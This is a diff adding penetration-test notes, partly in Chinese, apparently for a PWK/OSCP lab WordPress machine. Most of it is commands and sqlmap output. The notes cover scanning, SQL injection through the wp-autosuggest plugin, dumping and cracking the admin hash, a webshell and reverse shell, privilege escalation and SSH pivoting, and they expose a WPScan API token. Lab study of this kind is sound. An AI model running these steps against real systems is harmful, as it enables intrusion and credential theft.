@@ -1,0 +1,90 @@
+nmap -sTVC 10.11.1.251 -Pn > nmap.txt
+
+gobuster dir  -u http://10.11.1.251/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir  -u http://10.11.1.251/wp/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobusterwp.txt
+
+wpscan --url http://10.11.1.251/wp/ --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+
+sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell
+sqlmap --dbms=mysql -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
+
+
+sqlmap --dbms=mysql -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1"  --dbms MYSQL
+sqlmap --dbms=mysql -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1"  --batch
+sqlmap --dbms=mysql -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --dbs
+
+sqlmap --dbms=mysql -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" -D "wordpress" --sql-query "SELECT * FROM wp_users;"
+
+
+1.nmap掃描出端口後,在用gobuster找出wp路徑,發現在wordpress後用wp-scan掃
+2.wpscan掃可取得sql-shell,如提示有not able to fingerprint 則要清除cache (--fresh-queries)
+sqlmap -u "http://10.11.1.251/wp/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell --fresh-queries
+3.sql-shell查找到用戶名字admin及密碼$P$BeOfRd4RvUrEB.wG3xlHtVAXg1Gxm1/:monkey
+4.hashcat破解密碼
+hashcat -m 400 hash  /usr/share/wordlists/rockyou.txt
+5.登入wordpress管理後台,上傳shell.php到theme後找到/wp-content/uploads/找執行檔案,取得reverse shell
+6.密碼reuse,使用monkey登入到sean,sudo bash到root
+7.將公鑰匙丟到受害機器,啟動sshdunel
+sudo ssh -N -D 127.0.0.1:8080 root@10.11.1.251
+8.掃描其他網段
+sudo proxychains nmap --top-ports=20 -sT -Pn 10.1.1.246
+
+###取得機器版本
+version()   5.7.27-0ubuntu0.18.04.1
+###取得機器名稱
+select @@hostname: 'sean'
+###取得機器用戶
+select current_user: 'root@localhost'
+###取得表名稱
+SELECT database(): 'wordpress'
+###取得欄位名稱
+select table_name from information_schema.tables where table_schema = 'wordpress'
+select table_name from information_schema.tables where table_schema = 'wordpress'
+[*] wp_commentmeta
+[*] wp_comments
+[*] wp_links
+[*] wp_options
+[*] wp_postmeta
+[*] wp_posts
+[*] wp_term_relationships
+[*] wp_term_taxonomy
+[*] wp_termmeta
+[*] wp_terms
+[*] wp_usermeta
+[*] wp_users
+
+取得欄位內容
+sql-shell> SELECT * FROM wp_users
+[11:26:36] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
+[11:26:36] [INFO] retrieved: 10
+[11:26:38] [INFO] retrieved: ID
+[11:26:42] [INFO] retrieved: user_login
+[11:27:00] [INFO] retrieved: user_pass
+[11:27:16] [INFO] retrieved: user_nicename
+[11:27:40] [INFO] retrieved: user_email
+[11:27:57] [INFO] retrieved: user_url
+[11:28:11] [INFO] retrieved: user_registered
+[11:28:37] [INFO] retrieved: user_activation_key
+[11:29:10] [INFO] retrieved: user_status
+[11:29:30] [INFO] retrieved: display_name
+[11:29:51] [INFO] the query with expanded column name(s) is: SELECT ID, display_name, user_activation_key, user_email, user_login, user_nicename, user_pass, user_registered, user_status, user_url FROM wp_users
+[11:29:51] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+[11:29:51] [INFO] retrieved: 1
+[11:29:53] [INFO] retrieved: 1
+[11:29:55] [INFO] retrieved: admin
+[11:30:05] [INFO] retrieved:
+[11:30:06] [INFO] retrieved: sean@pwk.offsec.local
+[11:30:42] [INFO] retrieved: admin
+[11:30:51] [INFO] retrieved: admin
+[11:31:00] [INFO] retrieved: $P$BeOfRd4RvUrEB.wG3xlHtVAXg1Gxm1/
+[11:32:04] [INFO] retrieved: 2019-10-14 20:02:35
+[11:32:40] [INFO] retrieved: 0
+[11:32:42] [INFO] retrieved:
+
+
+
+
+
+
+
+
